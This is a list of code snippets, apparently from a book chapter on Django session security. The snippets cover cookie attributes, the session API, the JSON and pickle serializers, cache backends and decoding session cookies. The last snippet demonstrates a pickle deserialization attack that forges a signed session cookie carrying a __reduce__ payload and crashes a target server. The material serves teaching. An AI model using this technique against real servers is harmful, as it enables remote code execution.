["```py\nSet-Cookie: sessionid=<cookie-value>\n```", "```py\n...\nCookie: sessionid=cgqbyjpxaoc5x5mmm9ymcqtsbp7w7cn1; key=value;    \u2776\nHost: alice.com\nReferer: https:/./alice.com/admin/login/?next=/admin/\n...\n```", "```py\nSet-Cookie: sessionid=<session-id-value>; Secure\n```", "```py\nSet-Cookie: sessionid=<session-id-value>; Domain=alice.com\n```", "```py\nSESSION_COOKIE_DOMAIN = \"alice.com\"      \u2776\n```", "```py\nSet-Cookie: sessionid=<session-id-value>; Max-Age=1209600\n```", "```py\nfrom django.http import HttpResponse\n\nresponse = HttpResponse()\nresponse.set_cookie(\n    'cookie-name',\n    'cookie-value',\n    secure=True,           \u2776\n    domain='alice.com',    \u2777\n    max_age=42, )          \u2778\n```", "```py\nrequest.session['name'] = 'Alice'            \u2776\nname = request.session.get('name', 'Bob')    \u2777\nrequest.session['name'] = 'Charlie'          \u2778\ndel request.session['name']                  \u2779\n```", "```py\n>>> from django.contrib.sessions.serializers import JSONSerializer\n>>> \n>>> json_serializer = JSONSerializer()\n>>> serialized = json_serializer.dumps({'name': 'Bob'})    \u2776\n>>> serialized\nb'{\"name\":\"Bob\"}'                                          \u2777\n>>> json_serializer.loads(serialized)                      \u2778\n{'name': 'Bob'}                                            \u2779\n```", "```py\n>>> from django.contrib.sessions.serializers import PickleSerializer\n>>> \n>>> class Profile:\n...     def __init__(self, name):\n...         self.name = name\n... \n>>> pickle_serializer = PickleSerializer()\n>>> serialized = pickle_serializer.dumps(Profile('Bob'))          \u2776\n>>> serialized\nb'\\x80\\x05\\x95)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__...'   \u2777\n>>> deserialized = pickle_serializer.loads(serialized)            \u2778\n>>> deserialized.name                                             \u2779\n'Bob'\n```", "```py\nCACHES = {\n    'default': {\n        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',\n        'LOCATION': '127.0.0.1:11211',        \u2776\n    },\n    'cache': {\n        'BACKEND': 'django.core.cache.backends.memcached.PyLibMCCache',\n        'LOCATION': '/tmp/memcached.sock',    \u2777\n    }\n}\n```", "```py\nCACHES = {\n    'default': {\n        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',\n        'LOCATION': 'database_table_name',\n    }\n}\n```", "```py\nCACHES = {\n    'default': {\n        'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',\n    },\n    'dummy': {\n        'BACKEND': 'django.core.cache.backends.dummy.DummyCache',\n    }\n}\n```", "```py\nCACHES = {\n    'default': {\n        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',\n        'LOCATION': '/var/tmp/file_based_cache',\n    }\n}\n```", "```py\n$ python manage.py clearsessions\n```", "```py\n>>> import base64\n>>> import json\n>>> import requests\n>>> \n>>> credentials = {\n...     'username': 'eve',\n...     'password': 'evil', }\n>>> response = requests.post(                               \u2776\n...     'https:/./social.bob.com/login/',                    \u2776\n...     data=credentials, )                                 \u2776\n>>> sessionid = response.cookies['sessionid']               \u2777\n>>> decoded = base64.b64decode(sessionid.split(':')[0])     \u2777\n>>> json.loads(decoded)                                     \u2777\n{'name': 'Eve', 'username': 'eve', 'blocked_by': ['alice']} \u2778\n```", "```py\n$ python manage.py shell\n>>> import sys\n>>> from django.contrib.sessions.serializers import PickleSerializer\n>>> from django.core import signing\n>>> import requests\n>>> \n>>> class MaliciousCode:\n...     def __reduce__(self):                                              \u2776\n...         return sys.exit, ()                                            \u2777\n... \n>>> session_state = {'malicious_code': MaliciousCode(), }\n>>> sessionid = signing.dumps(                                             \u2778\n...     session_state,                                                     \u2778\n...     salt='django.contrib.sessions.backends.signed_cookies',            \u2778\n...     serializer=PickleSerializer)                                       \u2778\n>>> \n>>> session = requests.Session()\n>>> session.cookies['sessionid'] = sessionid\n>>> session.get('https:/./vulnerable.alice.com/')                           \u2779\nStarting new HTTPS connection (1): vulnerable.com\nhttp.client.RemoteDisconnected: Remote end closed connection without response\u277a\n```"]